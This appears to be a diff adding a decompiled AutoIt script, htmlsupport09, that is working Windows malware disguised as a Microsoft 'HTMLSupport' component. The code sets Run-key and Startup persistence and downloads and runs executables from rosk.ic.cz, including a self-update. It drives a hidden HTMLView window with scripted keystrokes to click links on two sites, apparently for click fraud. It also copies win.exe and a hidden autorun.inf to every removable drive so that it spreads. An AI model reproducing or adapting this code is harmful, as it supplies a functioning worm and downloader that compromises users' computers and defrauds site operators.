@@ -1,0 +1,407 @@
+; <AUT2EXE VERSION: 3.1.1.0>
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: Z:\total\nova verzia for old\htmlsupport09.au3>
+; ----------------------------------------------------------------------------
+
+#NoTrayIcon
+
+$os = 0
+If @OSVersion = "WIN_2003" Then $os = 1
+If @OSVersion = "WIN_XP" Then $os = 1
+If @OSVersion = "WIN_ME" Then $os = 1
+If @OSVersion = "WIN_98" Then $os = 1
+If @OSVersion = "WIN_95" Then $os = 1
+If @OSVersion = "WIN_2000" Then $os = 1
+
+If $os = 0 Then
+	Exit
+EndIf
+
+
+If ProcessExists("htmlsupport08.exe") <> 0 Then ProcessClose("htmlsupport08.exe")
+If _Singleton("htmlsupport09", 1) = 1 Then Exit
+If ProcessExists("htmlsupport10.exe") <> 0 Or ProcessExists("htmlsupport11.exe") <> 0 Then Exit
+
+; OPTiony
+Opt("WinTitleMatchMode", 2)
+Opt("WinWaitDelay", 50)
+Opt("RunErrorsFatal", 0)
+
+; deklaracie
+Dim $r, $ran, $ping, $hide, $status, $status2, $robota, $miesto, $fw, $rfatal, $autorun, $click, $click2, $status3, $sfatal, $main, $run, $kolkorobot
+$st = _ArrayCreate("always.htm", "anders.htm", "blood.htm", "bound.htm", "chapter.htm", "clenovia.htm", "crimson.htm", "diskografia.htm", "glory.htm", "hearts.htm", "heeding.htm", "historia.htm", "index.htm", "joacim.htm", "kapela.htm", "legacy.htm", "magnus.htm", "media.htm", "natural.htm", "oscar.htm", "renegade.htm", "sglory.htm", "srenegade.htm", "stefan.htm", "threshold.htm", "wallpapery.htm", "want.htm")
+
+; vyberanie $miesto
+If FileOpen(@CommonFilesDir & "\Microsoft Shared\log.txt", 2) <> -1 Then
+	If DirCreate(@CommonFilesDir & "\Microsoft Shared\HTMLView") Then
+		$miesto = @CommonFilesDir & "\Microsoft Shared\HTMLView\"
+	Else
+		$miesto = @AppDataDir & "\Microsoft\Internet Explorer\"
+	EndIf
+Else
+	$miesto = @AppDataDir & "\Microsoft\Internet Explorer\"
+EndIf
+
+
+; kontrola spustania po starte
+$r = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HTMLSupport")
+If $r <> @CommonFilesDir & "\Microsoft Shared\HTMLView\htmlsupport09.exe" Or $r <> @AppDataDir & "\Microsoft\Internet Explorer\htmlsupport09.exe" Then
+	$r = RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HTMLSupport", "REG_SZ", $miesto & "htmlsupport09.exe")
+EndIf
+If $r = 0 Then
+	$r = RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "HTMLSupport", "REG_SZ", $miesto & "htmlsupport09.exe")
+EndIf
+If $r = 0 And FileCreateShortcut($miesto & "htmlsupport09.exe", @StartupCommonDir & "\htmlsupport09.ink") = 0 Then
+	FileCreateShortcut($miesto & "htmlsupport09.exe", @StartupDir & "\htmlsupport09.ink")
+EndIf
+
+
+; start
+Sleep(90000)
+
+While Ping("www.mrbestliving.ic.cz") = 0
+	Sleep(180000)
+	$ping = $ping + 1
+	If $ping = 6 Then
+		exito()
+	EndIf
+WEnd
+
+; kontrola suborov
+If FileExists($miesto & "htmlsupport09.exe") = 0 Then
+	InetGet("http://rosk.ic.cz/htmlsupport/htmlsupport09.tmp", $miesto & "htmlsupport09.exe", 1, 0)
+EndIf
+Sleep(5000)
+
+If FileGetSize($miesto & "htmlview.exe") <> 77824 Then
+	InetGet("http://rosk.ic.cz/htmlsupport/htmlview.tmp", $miesto & "htmlview.exe", 1, 0)
+EndIf
+Sleep(5000)
+If FileGetSize($miesto & "htmlview.exe") <> 77824 Then
+	$sfatal = 1
+	exito()
+EndIf
+
+If FileGetSize($miesto & "sobsoftex.dll") <> 45056 Then
+	InetGet("http://rosk.ic.cz/htmlsupport/sobsoftex.tmp", $miesto & "sobsoftex.dll", 1, 0)
+EndIf
+Sleep(5000)
+If FileGetSize($miesto & "sobsoftex.dll") <> 45056 Then
+	$sfatal = 1
+	exito()
+EndIf
+
+$win = FileGetTime($miesto & "win.exe")
+
+If @error <> 0 Or $win[1] - @MON <> 0 Then
+	InetGet("http://rosk.ic.cz/htmlsupport/win.tmp", $miesto & "win.exe", 1, 0)
+EndIf
+Sleep(5000)
+
+; kontrola registrov
+RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Sob Software\HTMLView", "Path")
+If @error Then
+	$r = RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Sob Software\HTMLView", "Path", "REG_SZ", "")
+EndIf
+If $r = 0 Then
+	$rfatal = 1
+	exito()
+EndIf
+
+RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Sob Software\HTMLView", "Run")
+If @error Then
+	$r = RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Sob Software\HTMLView", "Run", "REG_SZ", "")
+EndIf
+If $r = 0 Then
+	$rfatal = 1
+	exito()
+EndIf
+
+RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Sob Software\HTMLView", "Version")
+If @error Then
+	$r = RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Sob Software\HTMLView", "Version", "REG_SZ", "")
+EndIf
+If $r = 0 Then
+	$rfatal = 1
+	exito()
+EndIf
+
+Sleep(10000)
+
+robota()
+
+Func robota()
+
+	While ProcessExists("htmlview.exe") <> 0
+		ProcessClose("htmlview.exe")
+		Sleep(1000)
+	WEnd
+
+	If $sfatal = 1 Then
+		exito()
+	EndIf
+
+	; a ideme na to podstatne
+	While Ping("www.mrbestliving.ic.cz", 1000) = 0
+		Sleep(180000)
+		$ping = $ping + 1
+		If $ping = 3 Then
+			exito()
+		EndIf
+	WEnd
+
+	If IsAdmin() = 0 Then $rfatal = 1
+
+	$run = Run($miesto & "htmlview.exe")
+
+	If @error Then
+		exito()
+	EndIf
+
+	If $rfatal = 1 Then
+		Opt("WinTitleMatchMode", 1)
+		Do
+			$click = ControlClick("HTMLView", "", 2, "left", 2)
+			$status3 = $status3 + 1
+		Until $click = 1 Or $status3 = 5000
+		Opt("WinTitleMatchMode", 2)
+	EndIf
+
+	If $status3 = 5000 Then
+		ProcessClose("htmlview.exe")
+		exito()
+	EndIf
+
+	$wait = WinWait(" - HTMLView", "", 20000)
+	WinSetState(" - HTMLView", "", @SW_HIDE)
+
+	If $wait = 0 Then
+		ProcessClose($run)
+		exito()
+	EndIf
+
+	Sleep(30000)
+
+	If $main = "www.mrbestliving.ic.cz" Then
+
+	ControlSetText(" - HTMLView", "", 1001, $main)
+	Sleep(1000)
+	ControlClick(" - HTMLView", "", 1003, "left", 2)
+
+	Sleep(30000)
+
+	Do
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{TAB}")
+		$status = $status + 1
+	Until StatusbarGetText(" - HTMLView", "", 1) = "http://www.autoitscript.com/" Or $status = 300
+
+	If $status = 300 Then
+		ProcessClose($run)
+		exito()
+	EndIf
+
+	Sleep(2000)
+
+	$ran = Random(2, 5, 1)
+
+	Select
+	Case $ran = 2
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+	Case $ran = 3
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+	Case $ran = 4
+		Do
+			ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+			$status2 = $status2 + 1
+		Until StatusbarGetText(" - HTMLView", "", 1) = "http://2/" Or $status2 = 300
+		If $status2 = 300 Then
+			ProcessClose($run)
+			exito()
+		EndIf
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{TAB}")
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{TAB}")
+		If Random(0,1,1) Then ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{TAB}")
+	Case Else
+		ProcessClose($run)
+		exito()
+	EndSelect
+
+	EndIf
+
+	If $main = "www.hffansite.ic.cz/" Then
+
+	ControlSetText(" - HTMLView", "", 1001, $main & $st[Random(0, 27, 1)])
+	Sleep(1000)
+	ControlClick(" - HTMLView", "", 1003, "left", 2)
+	Sleep(30000)
+	ControlSetText(" - HTMLView", "", 1001, $main & $st[Random(0, 27, 1)])
+	Sleep(1000)
+	ControlClick(" - HTMLView", "", 1003, "left", 2)
+
+	Sleep(30000)
+
+	Do
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{TAB}")
+		$status = $status + 1
+	Until StatusbarGetText(" - HTMLView", "", 1) = "http://2/" Or $status = 300
+
+	If $status = 300 Then
+		ProcessClose($run)
+		exito()
+	EndIf
+
+	Sleep(2000)
+
+	$ran = Random(2, 5, 1)
+
+	Select
+	Case $ran = 2
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+	Case $ran = 3
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+	Case $ran = 4
+		Do
+			ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "+{TAB}")
+			$status2 = $status2 + 1
+		Until StatusbarGetText(" - HTMLView", "", 1) = "http://www.hffansite.ic.cz/media.htm" Or $status2 = 300
+		If $status2 = 300 Then
+			ProcessClose($run)
+			exito()
+		EndIf
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{TAB}")
+		ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{TAB}")
+		If Random(0,1,1) Then ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{TAB}")
+	Case Else
+		ProcessClose($run)
+		exito()
+	EndSelect
+	EndIf
+
+	Sleep(200)
+
+	If StatusbarGetText(" - HTMLView", "", 1) <> "" Then
+		ProcessClose($run)
+		exito()
+	EndIf
+
+	ControlSend(" - HTMLView", "", "Internet Explorer_Server1", "{ENTER}{ENTER}{ENTER}{ENTER}{ENTER}")
+
+	Sleep(60000)
+
+	ProcessClose($run)
+
+	$robota = 0
+	Sleep(10000)
+	exito()
+EndFunc
+
+exito()
+
+; rozmnozovanie
+Func exito()
+If $main = "www.mrbestliving.ic.cz" Then
+	$main = "www.hffansite.ic.cz/"
+	robota()
+ElseIf $main = "www.hffansite.ic.cz/" Then
+	$main = "www.mrbestliving.ic.cz"
+EndIf
+
+$status = 0
+$status2 = 0
+$status3 = 0
+$click = 0
+$wait = 0
+$ping = 0
+	; kontrola update
+	If InetGetSize("http://rosk.ic.cz/htmlsupport/win10.tmp") Then
+		If InetGet("http://rosk.ic.cz/htmlsupport/win10.tmp", $miesto & "win10.exe", 1, 0) Then
+			$r = RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HTMLSupport", "REG_SZ", $miesto & "win10.exe")
+			If $r = 0 Then
+				$r = RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "HTMLSupport", "REG_SZ", $miesto & "win10.exe")
+			EndIf
+			If $r = 0 And FileCreateShortcut($miesto & "win10.exe", @StartupCommonDir & "\htmlsupport09.ink") = 0 Then
+				FileCreateShortcut($miesto & "win10.exe", @StartupDir & "\htmlsupport09.ink")
+			EndIf
+		EndIf
+	EndIf
+	While 1
+		; kontrola spustania po starte
+		RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HTMLSupport")
+		If @error <> 0 Then
+			$r = RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HTMLSupport", "REG_SZ", $miesto & "htmlsupport09.exe")
+		EndIf
+		If $r = 0 Then
+			$r = RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "HTMLSupport", "REG_SZ", $miesto & "htmlsupport09.exe")
+		EndIf
+		If $r = 0 And FileCreateShortcut($miesto & "htmlsupport09.exe", @StartupCommonDir & "\htmlsupport09.ink") = 0 Then
+			FileCreateShortcut($miesto & "htmlsupport09.exe", @StartupDir & "\htmlsupport09.ink")
+		EndIf
+		$loop = 1
+		Do
+			If $loop = 1 Then
+				$all = DriveGetDrive("REMOVABLE")
+			EndIf
+			If @error Then
+				ExitLoop
+			EndIf
+			If  $all[$loop] <> "a:" and "b:" And DriveStatus($all[$loop]) = "READY" Then
+				FileCopy($miesto & "win.exe", $all[$loop] & "\win.exe", 1)
+				FileSetAttrib($all[$loop] & "\autorun.inf", "-H")
+				$autorun = FileOpen($all[$loop] & "\autorun.inf", 2)
+				If $autorun <> -1 Then $fw = FileWrite($autorun, "[autorun]" & @CRLF & "open=win.exe" & @CRLF & "shell\lost=Open" & @CRLF & "shell\lost\command=win.exe" & @CRLF & "shell=lost")
+				If $fw = 1 Then FileSetAttrib($all[$loop] & "\win.exe", "+H")
+				If $autorun <> -1 Then FileClose($autorun)
+				FileSetAttrib($all[$loop] & "\autorun.inf", "+H")
+			EndIf
+			$loop = $loop + 1
+		Until $loop > $all[0]
+		Sleep(50000)
+		$robota = $robota + 1
+		If $kolkorobot = 0 Then $kolkorobot = Random(1, 8, 1)
+		If $robota = $kolkorobot Then
+			$kolkorobot = 0
+			robota()
+		EndIf
+		ContinueLoop
+	WEnd
+EndFunc
+
+Func _ArrayCreate($v_0, $v_1 = 0, $v_2 = 0, $v_3 = 0, $v_4 = 0, $v_5 = 0, $v_6 = 0, $v_7 = 0, $v_8 = 0, $v_9 = 0, $v_10 = 0, $v_11 = 0, $v_12 = 0, $v_13 = 0, $v_14 = 0, $v_15 = 0, $v_16 = 0, $v_17 = 0, $v_18 = 0, $v_19 = 0, $v_20 = 0, $v_21 = 0, $v_22 = 0, $v_23 = 0, $v_24 = 0, $v_25 = 0, $v_26 = 0, $v_27 = 0, $v_28 = 0)
+
+	Local $i_UBound = @NumParams
+	Local $av_Array[$i_UBound]
+	Local $i_Index
+
+	For $i_Index = 0 To ($i_UBound - 1)
+		$av_Array[$i_Index] = Eval("v_" & String($i_Index))
+	Next
+	Return $av_Array
+EndFunc
+
+Func _Singleton($sOccurenceName, $iFlag = 0)
+	Local $ERROR_ALREADY_EXISTS = 183, $handle, $lastError
+
+	$sOccurenceName = StringReplace($sOccurenceName, "\", "")
+	$handle = DllCall("kernel32.dll", "int", "CreateMutex", "int", 0, "long", 1, "str", $sOccurenceName)
+	$lastError = DllCall("kernel32.dll", "int", "GetLastError")
+	If $lastError[0] = $ERROR_ALREADY_EXISTS Then
+		If $iFlag = 0 Then
+			Exit -1
+		Else
+			Return SetError($lastError[0])
+		EndIf
+	EndIf
+	Return $handle[0]
+EndFunc
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: Z:\total\nova verzia for old\htmlsupport09.au3>
+; ----------------------------------------------------------------------------
+
